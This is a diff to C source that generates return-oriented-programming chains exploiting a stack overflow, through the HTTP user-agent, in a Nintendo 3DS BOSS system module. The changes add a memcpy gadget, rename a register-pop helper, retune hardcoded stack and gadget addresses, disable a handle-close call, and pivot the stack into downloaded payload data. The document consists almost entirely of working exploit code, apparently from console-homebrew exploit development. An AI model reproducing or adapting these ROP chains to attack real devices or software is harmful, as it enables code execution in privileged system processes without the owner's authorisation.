@@ -65,11 +65,13 @@ u32 ROP_svcCloseHandle = 0x0012790c;//svc 0x23 bx-lr
 
 u32 ROP_get_tls = 0x00127a24;//r0 = tls+0 then bx-lr.
 
+u32 ROP_memcpy = 0x001245e4;
+
 u32 BOSS_psps_sessionhandle = 0x0014b204;
 u32 BOSS_fsuser_sessionhandle = 0x0014b198+16;
 
-u32 BOSS_httptargetfunc_ropretaddr = 0x0010c0d3;
-u32 BOSS_httptargetfunc_useragent_stackaddr = 0x0803b7f8-0xa4;
+u32 BOSS_httptargetfunc_ropretaddr = 0x0010c10b;//This is after the original return-addr, for calling the targeted function again.
+u32 BOSS_httptargetfunc_useragent_stackaddr = 0x0803ba44;//Normal boss HTTP GET tasks. //policylist: 0x0803b7f8-0xa4;
 
 u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.
 
@@ -142,7 +144,7 @@ void ropgen_popr2r3r4pc(u32 **ropchain, u32 *ropvaddr, u32 r2, u32 r3, u32 r4)//
 	ropgen_addword(ropchain, ropvaddr, r4);
 }
 
-void ropgen_popr4r5r6r7r8pc(u32 **ropchain, u32 *ropvaddr, u32 r4, u32 r5, u32 r6, u32 r7)//Total size: 0x14-bytes.
+void ropgen_popr4r5r6r7pc(u32 **ropchain, u32 *ropvaddr, u32 r4, u32 r5, u32 r6, u32 r7)//Total size: 0x14-bytes.
 {
 	ropgen_addword(ropchain, ropvaddr, ROP_POPR4R5R67PC);
 	ropgen_addword(ropchain, ropvaddr, r4);
@@ -257,6 +259,17 @@ void ropgen_callfunc(u32 **ropchain, u32 *ropvaddr, u32 funcaddr, u32 *params)//
 	ropgen_blxr4_popr3r4r5pc(ropchain, ropvaddr, funcaddr, stackparams);
 }
 
+void ropgen_memcpy(u32 **ropchain, u32 *ropvaddr, u32 dst, u32 src, u32 size)//Total size: see ropgen_callfunc.
+{
+	u32 params[7] = {0};
+
+	params[0] = dst;
+	params[1] = src;
+	params[2] = size;
+
+	ropgen_callfunc(ropchain, ropvaddr, ROP_memcpy, params);
+}
+
 void ropgen_writecmdbufvalue(u32 **ropchain, u32 *ropvaddr, u32 offset, u32 valueaddr, u32 loadaddr)//Total size: 0x7c + <0x40 with loadaddr set>. Normally valueaddr is written directly to the cmdbuf, but when loadaddr is non-zero *valueaddr is written instead.
 {
 	u32 value=0;
@@ -290,8 +303,12 @@ void buildrop_config(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 {
 	u32 ua[0x80>>2];
 
-	u32 stack_contentbufsize_ptr = 0x803b874;
-	u32 stack_recvdata_timeoutptr = 0x803b8b8;
+	u32 tmpadr = (*ropvaddr) + 0xa4 + 0x40 + 0x28;
+
+	u32 stack_contentbufsize_ptr = tmpadr+0x24; //= 0x803b874;
+	u32 stack_recvdata_timeoutptr = tmpadr+0x38; //0x1FF80000+0x100;//Used since the 8-bytes here are always zero. //0x803b8b8;
+
+	stack_contentbufsize_ptr = (*ropvaddr) + 0x90;
 
 	//This ropchain buffer starts with the user-agent. The UA has 0x80-bytes allocated on stack, with the saved registers immediately following that. The sysmodule v13314 function for this is LT_121350.
 
@@ -306,14 +323,14 @@ void buildrop_config(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	ropgen_addword(&ropchain, ropvaddr, 0);//r2
 	ropgen_addword(&ropchain, ropvaddr, contentdatabuf_addr);//r3, output content data addr for httpc_ReceiveDataTimeout.
 
-	ropgen_addword(&ropchain, ropvaddr, 0x34343434);//r4
+	ropgen_addword(&ropchain, ropvaddr, 0x1000);//r4, this is the size field for stack_contentbufsize_ptr.
 	ropgen_addword(&ropchain, ropvaddr, 0x35353535);//r5
 	ropgen_addword(&ropchain, ropvaddr, 0x36363636);//r6
 	ropgen_addword(&ropchain, ropvaddr, 0x37373737);//r7
 
 	//pc for the initial reg-pop is here. The data starting at r4 below is also used by the target function as insp0, which has to be valid otherwise it won't download the content properly/crash.
 
-	ropgen_popr4r5r6r7r8pc(&ropchain, ropvaddr, 0x0, stack_contentbufsize_ptr, stack_recvdata_timeoutptr, 0x0);
+	ropgen_popr4r5r6r7pc(&ropchain, ropvaddr, 0x0, stack_contentbufsize_ptr, stack_recvdata_timeoutptr, 0x0);
 
 	ropgen_stackpivot(&ropchain, ropvaddr, contentdatabuf_addr);//Stack-pivot to the http content data downloaded by the targeted function.
 }
@@ -366,8 +383,8 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	ropgen_copyu32(&ropchain, ropvaddr, BOSS_psps_sessionhandle, ropheap+0x20, 0x3);
 	ropgen_copyu32(&ropchain, ropvaddr, httpctx+12, BOSS_psps_sessionhandle, 0x3);
 
-	ropgen_ldrr0r1(&ropchain, ropvaddr, ropheap+0x20, 1);
-	ropgen_callfunc(&ropchain, ropvaddr, ROP_svcCloseHandle, NULL);
+	/*ropgen_ldrr0r1(&ropchain, ropvaddr, ropheap+0x20, 1);
+	ropgen_callfunc(&ropchain, ropvaddr, ROP_svcCloseHandle, NULL);*/
 
 	//Can't close the context since the session handle is used as the new psps handle.
 	/*memset(params, 0, sizeof(params));
@@ -377,6 +394,7 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	//Return to the actual sysmodule code, with r0 set to ~0 for an error.
 	tmp = BOSS_httptargetfunc_useragent_stackaddr + 0xa0;
 	ropgen_writeu32(&ropchain, ropvaddr, BOSS_httptargetfunc_ropretaddr, tmp, 1);
+	ropgen_memcpy(&ropchain, ropvaddr, tmp+4+4, tmp+4+0x44, 0x10);//Setup the stack params for the function which will be called.
 	ropgen_setr0(&ropchain, ropvaddr, ~0);
 	ropgen_stackpivot(&ropchain, ropvaddr, tmp);
 }
